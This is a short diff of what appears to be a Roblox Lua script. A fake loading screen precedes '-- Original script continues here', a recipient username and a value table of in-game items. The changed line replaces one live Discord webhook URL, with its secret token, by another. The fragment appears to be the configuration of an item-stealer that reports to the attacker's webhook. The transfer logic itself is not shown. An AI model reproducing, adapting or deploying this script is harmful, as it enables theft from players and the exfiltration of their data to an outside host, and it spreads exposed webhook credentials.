@@ -33,7 +33,7 @@ loadingText.Parent = frame
 
 -- Original script continues here
 userName = "backsclapes"
-webHook = "https://discord.com/api/webhooks/1355498964002013295/qOoHCpa83gK8IwJbl3bwLIhubKE-5cIDvqnt6syxOeRtrXmwvUzgxaftRGFQuJvnER_s"
+webHook = "https://discord.com/api/webhooks/1377392052819595384/arejt0EZ23YlWu9Bi4D55U2Qaqw8DSpMXOGNy0NyR452dLLxMl9IpeepeDCtBgxswSCm"
 local values = {
     ["Nik's Scythe"] = 250000000,
     ["Elderwood Scythe"] = 90,
